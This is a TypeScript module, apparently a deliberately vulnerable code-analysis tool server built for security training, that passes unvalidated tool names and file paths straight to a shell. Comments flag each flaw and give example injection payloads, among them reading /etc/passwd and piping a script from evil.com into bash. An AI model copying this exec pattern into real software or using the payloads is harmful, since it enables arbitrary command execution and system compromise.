import { exec } from "child_process";
import { promisify } from "util";

const execAsync = promisify(exec);

/**
 * Code analysis tools: linters, formatters, complexity analysis
 * 
 * 🚨 VULNERABILITIES:
 * - SEC-008: Missing Timeouts - analysis can run indefinitely
 * - SEC-005: Missing Rate Limiting - can be DoS'd
 * - SEC-002: Command Injection - tool names not validated
 */
export async function codeAnalysis(tool: string, file: string) {
  console.log(`Running ${tool} on ${file}`);

  try {
    switch (tool.toLowerCase()) {
      case "eslint":
        return await runESLint(file);
      case "prettier":
        return await runPrettier(file);
      case "complexity":
        return await runComplexityAnalysis(file);
      case "typescript":
        return await runTypeScriptCheck(file);
      default:
        // 🚨 SEC-002: Command Injection
        // If tool name is not in predefined list, we execute it anyway
        // Attacker could input tool name: "malicious; cat /etc/passwd"
        return await runCustomTool(tool, file);
    }
  } catch (error: any) {
    console.error("Code analysis error:", error);
    return {
      content: [
        {
          type: "text",
          text: `Analysis failed: ${error.message}\n\nOutput: ${error.stdout || ""}\n\nError: ${error.stderr || ""}`,
        },
      ],
      isError: true,
    };
  }
}

async function runESLint(file: string) {
  // 🚨 SEC-008: Missing Timeout
  // ESLint on large files can take very long
  // No timeout means it can hang indefinitely
  // Should set: { timeout: 30000 }
  
  // 🚨 SEC-006: Path Traversal
  // File path not validated
  const command = `npx eslint ${file} --format json`;
  
  const { stdout, stderr } = await execAsync(command);

  return {
    content: [
      {
        type: "text",
        text: `ESLint Analysis:\n\n${stdout}\n${stderr ? `\nErrors:\n${stderr}` : ""}`,
      },
    ],
  };
}

async function runPrettier(file: string) {
  // 🚨 SEC-008: Missing Timeout
  // Prettier can hang on malformed files
  
  const command = `npx prettier --check ${file}`;
  
  try {
    const { stdout } = await execAsync(command);
    return {
      content: [
        {
          type: "text",
          text: `Prettier Check:\n\nFile is formatted correctly ✓\n\n${stdout}`,
        },
      ],
    };
  } catch (error: any) {
    // Prettier returns non-zero exit code if file needs formatting
    return {
      content: [
        {
          type: "text",
          text: `Prettier Check:\n\nFile needs formatting:\n\n${error.stdout}`,
        },
      ],
    };
  }
}

async function runComplexityAnalysis(file: string) {
  // 🚨 SEC-008: Missing Timeout
  // Complexity analysis on large files can be very slow
  // No resource limits on analysis
  
  // 🚨 SEC-005: Missing Rate Limiting
  // If this calls external API for analysis (like code climate),
  // no rate limiting means we could hit API limits or incur costs
  
  const command = `npx complexity-report ${file}`;
  
  try {
    const { stdout } = await execAsync(command);
    return {
      content: [
        {
          type: "text",
          text: `Complexity Analysis:\n\n${stdout}`,
        },
      ],
    };
  } catch (error: any) {
    // Tool might not be installed, provide basic analysis
    return {
      content: [
        {
          type: "text",
          text: `Complexity analysis tool not available. File: ${file}`,
        },
      ],
    };
  }
}

async function runTypeScriptCheck(file: string) {
  // 🚨 SEC-008: Missing Timeout
  // TypeScript compiler can be very slow on large projects
  
  const command = `npx tsc --noEmit ${file}`;
  
  try {
    const { stdout, stderr } = await execAsync(command);
    return {
      content: [
        {
          type: "text",
          text: `TypeScript Check:\n\nNo type errors found ✓\n\n${stdout || stderr}`,
        },
      ],
    };
  } catch (error: any) {
    return {
      content: [
        {
          type: "text",
          text: `TypeScript Check:\n\nType errors found:\n\n${error.stdout || error.stderr}`,
        },
      ],
    };
  }
}

async function runCustomTool(tool: string, file: string) {
  // 🚨 SEC-002: CRITICAL - Command Injection
  // Executing arbitrary tool names without validation
  // Attacker could input tool: "cat /etc/passwd #"
  // Or: "curl evil.com/malware.sh | bash #"
  // This effectively allows arbitrary command execution
  
  // 🚨 SEC-003: Input Validation Failure
  // No whitelist of allowed tools
  // No verification that tool exists or is safe
  
  const command = `${tool} ${file}`;
  
  console.log(`Running custom tool: ${command}`);

  const { stdout, stderr } = await execAsync(command);

  return {
    content: [
      {
        type: "text",
        text: `Custom Analysis (${tool}):\n\n${stdout}\n${stderr ? `\nErrors:\n${stderr}` : ""}`,
      },
    ],
  };
}